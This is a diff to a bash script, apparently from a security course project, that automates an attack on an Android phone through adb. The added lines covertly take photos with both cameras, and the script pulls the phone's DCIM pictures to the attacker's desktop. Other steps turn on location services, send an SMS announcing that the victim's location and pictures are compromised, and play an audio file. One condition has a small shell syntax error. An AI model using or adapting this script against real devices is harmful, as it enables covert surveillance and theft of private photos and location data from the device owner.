@@ -16,11 +16,49 @@ do
 				adb shell rm /sdcard/attacklog.txt
 				adb shell logcat -c
 
+				# wake screen
+				adb shell input tap 0 0
+
+				# taking pictures using camera
+				# first direction
+				adb shell am start -a android.media.action.IMAGE_CAPTURE
+				$SLEEP
+				adb	shell input keyevent 27 # take picture
+				$SLEEP
+				orientation=$(adb shell dumpsys input | grep 'SurfaceOrientation' | awk '{ print $2+0 }')
+				if [ $orientation -eq 1 ] || [ $orientation -eq 3]
+					then
+						echo horizontal
+						adb shell input tap 600 450
+				else 
+					echo vertical
+					adb shell input tap 350 750
+				fi
+				$SLEEP
+				# second direction
+				adb shell am start -a android.media.action.IMAGE_CAPTURE
+				$SLEEP
+				adb shell input tap 20 50 	# flip
+				$SLEEP
+				adb shell input keyevent 27 # take picture
+				$SLEEP
+				orientation=$(adb shell dumpsys input | grep 'SurfaceOrientation' | awk '{ print $2+0 }')
+				if [ $orientation -eq 1 ] || [ $orientation -eq 3]
+					then
+						echo horizontal
+						adb shell input tap 600 450
+				else 
+					echo vertical
+					adb shell input tap 350 750
+				fi
+				$SLEEP
+				adb shell input keyevent 3 	# home
+				$SLEEP 
+
 				# copy contents of DCIM from phone to desktop/output
 				adb pull /storage/sdcard0/DCIM/. /home/cs5231/Desktop/output/
 
 				# enable location services and locate
-				adb shell input tap 0 0
 				$SLEEP
 				adb shell am start -a android.settings.LOCATION_SOURCE_SETTINGS
 				$SLEEP
@@ -39,9 +77,12 @@ do
 				# sms
 				adb shell am start -a android.intent.action.SENDTO -d sms:101010101010 --es sms_body "Your location and pictures have been compromised" 
 				$SLEEP
-				# play music				
+
+				# play music
+				adb push /home/cs5231/Desktop/play.mp3 storage/sdcard0/Music/play.mp3			
 				adb shell am start -a android.intent.action.VIEW -d file:///storage/sdcard0/Music/play.mp3 -t audio/mp3
 				$SLEEP
+
 				# dump and pull log
 				adb shell logcat -v raw -f /sdcard/attacklog.txt -d
 				adb pull /sdcard/attacklog.txt /home/cs5231/Desktop/attacklog.txt
